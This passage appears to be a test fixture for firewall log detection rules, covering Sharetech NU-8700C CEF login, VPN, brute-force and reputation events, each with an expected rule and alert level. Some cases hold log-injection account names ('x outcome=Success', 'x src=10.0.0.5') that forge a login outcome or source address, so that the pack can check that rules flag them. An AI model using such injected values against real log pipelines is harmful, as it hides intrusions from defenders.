@@ -1,0 +1,397 @@
+{
+ "pack": "jt-sharetech",
+ "cases": [
+  {
+   "log": "Sep 12 10:49:27 fw1 conntrack: CEF:0|Sharetech|NU-8700C|9.0.3|10|TRAFFIC|10|deviceExternalId=P00000001 dvchost=NU-8700C cs1Label=Rule cs1=15c act=allow proto=TCP start=1757645301000 end=1757645367000 src=10.0.6.67 dst=10.0.0.80 spt=50237 dpt=13111 out=1503 in=1394 cn1Label=APP cn1=0",
+   "expect_rule": "none",
+   "expect_level": 0,
+   "note": "real traffic record: never alerted (rule 100501 level 0)"
+  },
+  {
+   "log": "Sep 12 12:00:05 fw1 conntrack: CEF:0|Sharetech|NU-8700C|9.0.3|10|TRAFFIC|10| deviceExternalId=P00000001 dvchost=NU-8700C cs1Label=Rule cs1=129 act=allow proto=TCP start=1757649325000 end=1757649605000 src=10.0.6.153 dst=203.0.113.54 spt=56024 dpt=443 out=2110 in=13420 cn1Label=APP cn1=1270",
+   "expect_rule": "none",
+   "expect_level": 0,
+   "note": "traffic record with a space after the header (as pasted into logtest in the site notes)"
+  },
+  {
+   "log": "Oct  8 15:33:38 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=10.0.0.113 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Success",
+   "expect_rule": "100571",
+   "expect_level": 3,
+   "note": "real successful admin login from the LAN: level 3",
+   "expect_in_description": [
+    "fwadmin",
+    "10.0.0.113"
+   ]
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.20 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Success",
+   "expect_rule": "100580",
+   "expect_level": 8,
+   "note": "admin login from a public address: the management interface is reachable from outside"
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=111 src=10.0.0.113 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+   "expect_rule": "100572",
+   "expect_level": 5,
+   "note": "real failed admin login (typed account 111)",
+   "expect_in_description": [
+    "111",
+    "10.0.0.113"
+   ]
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.21 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+   "expect_rule": "100573",
+   "expect_level": 10,
+   "note": "fifth failure from one address: brute force",
+   "before": [
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=a0 src=198.51.100.21 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=a1 src=198.51.100.21 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=a2 src=198.51.100.21 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=a3 src=198.51.100.21 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail"
+   ]
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.22 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Success",
+   "expect_rule": "100581",
+   "expect_level": 12,
+   "note": "success right after a brute force from the same address",
+   "before": [
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.22 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.22 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.22 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.22 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.22 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail"
+   ]
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.23 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Success",
+   "expect_rule": "100580",
+   "expect_level": 8,
+   "note": "four failures then success: below the brute-force count, so the success is only a public login",
+   "before": [
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.23 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.23 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.23 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+    "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=fwadmin src=198.51.100.23 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail"
+   ]
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=x outcome=Success src=198.51.100.24 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+   "expect_rule": "100505",
+   "expect_level": 10,
+   "note": "account typed as \"x outcome=Success\": the failure would read as a success; flagged, no login marker",
+   "expect_in_description": [
+    "outcome"
+   ]
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[9455]: CEF:0|Sharetech|NU-8700C|9.0.3|1001|SYSTEM_EVENT_LOGIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759908837000 suser=x src=10.0.0.5 src=198.51.100.25 SharetechManagementIP=10.0.0.1 act=Login cs1Label=Path cs1=System Login cs2Label=Function cs2=System Login outcome=Fail",
+   "expect_rule": "100505",
+   "expect_level": 10,
+   "note": "account typed as \"x src=10.0.0.5\": the source would be forged to an internal address"
+  },
+  {
+   "log": "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=x src=10.0.0.5 src=198.51.100.26 cs2Label=Event cs2=REFUSE",
+   "expect_rule": "100505",
+   "expect_level": 10,
+   "note": "the same through the VPN login"
+  },
+  {
+   "log": "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=alice src=198.51.100.30 cs2Label=Event cs2=Login",
+   "expect_rule": "100576",
+   "expect_level": 3,
+   "note": "real SSL VPN login (event spelled \"Login\")",
+   "expect_in_description": [
+    "alice",
+    "SSLVPN"
+   ]
+  },
+  {
+   "log": "Oct  8 15:45:02 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=alice src=198.51.100.30 cs2Label=Event cs2=Logout",
+   "expect_rule": "none",
+   "expect_level": 0,
+   "note": "real VPN logout: silent"
+  },
+  {
+   "log": "Oct  8 16:42:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=bob src=198.51.100.31 cs2Label=Event cs2=REFUSE",
+   "expect_rule": "100577",
+   "expect_level": 5,
+   "note": "real refused VPN login"
+  },
+  {
+   "log": "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=carol src=198.51.100.32 cs2Label=Event cs2=REFUSE",
+   "expect_rule": "100578",
+   "expect_level": 10,
+   "note": "fifth refusal from one address",
+   "before": [
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=u0 src=198.51.100.32 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=u1 src=198.51.100.32 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=u2 src=198.51.100.32 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=u3 src=198.51.100.32 cs2Label=Event cs2=REFUSE"
+   ]
+  },
+  {
+   "log": "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=dave src=198.51.100.33 cs2Label=Event cs2=Login",
+   "expect_rule": "100582",
+   "expect_level": 12,
+   "note": "VPN login right after a run of refusals from it",
+   "before": [
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=dave src=198.51.100.33 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=dave src=198.51.100.33 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=dave src=198.51.100.33 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=dave src=198.51.100.33 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=dave src=198.51.100.33 cs2Label=Event cs2=REFUSE"
+   ]
+  },
+  {
+   "log": "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=erin src=198.51.100.49 cs2Label=Event cs2=REFUSE",
+   "expect_rule": "100584",
+   "expect_level": 10,
+   "note": "one account refused from eight different addresses: distributed guessing",
+   "before": [
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=erin src=198.51.100.40 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=erin src=198.51.100.41 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=erin src=198.51.100.42 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=erin src=198.51.100.43 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=erin src=198.51.100.44 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=erin src=198.51.100.45 cs2Label=Event cs2=REFUSE",
+    "Oct  8 14:37:01 fw1 vpnlog: CEF:0|Sharetech|NU-8700C|9.0.3|112|VPN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759905397000 cs1Label=VpnType cs1=SSLVPN suser=erin src=198.51.100.46 cs2Label=Event cs2=REFUSE"
+   ]
+  },
+  {
+   "log": "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.14 dst=198.51.100.10 proto=TCP dpt=2222 cnt=1",
+   "expect_rule": "100510",
+   "expect_level": 6,
+   "note": "real Sandstorm reputation block from the Internet: background noise, level 6",
+   "expect_in_description": [
+    "SANDSTORM_IP",
+    "203.0.113.14"
+   ]
+  },
+  {
+   "log": "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=10.0.3.40 dst=203.0.113.99 proto=TCP dpt=443 cnt=1",
+   "expect_rule": "100512",
+   "expect_level": 10,
+   "note": "an internal host trying to reach a reputation-listed address: a lead"
+  },
+  {
+   "log": "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+   "expect_rule": "100590",
+   "expect_level": 10,
+   "note": "20 blocks from one source in a minute",
+   "before": [
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1",
+    "Oct  8 11:24:01 fw1 FirewallDefense: CEF:0|Sharetech|NU-8700C|9.0.3|50|FIREWALL_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893833000 cs1Label=AttackType cs1=SANDSTORM_IP deviceInboundInterface=zone2 src=203.0.113.15 dst=198.51.100.10 proto=TCP dpt=22 cnt=1"
+   ]
+  },
+  {
+   "log": "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_MS_Terminal_Server_Traffic_on_Non-standard_Port act=Log proto=TCP src=203.0.113.92 dst=10.0.0.5 spt=65176 dpt=25 cat=2023753",
+   "expect_rule": "100520",
+   "expect_level": 6,
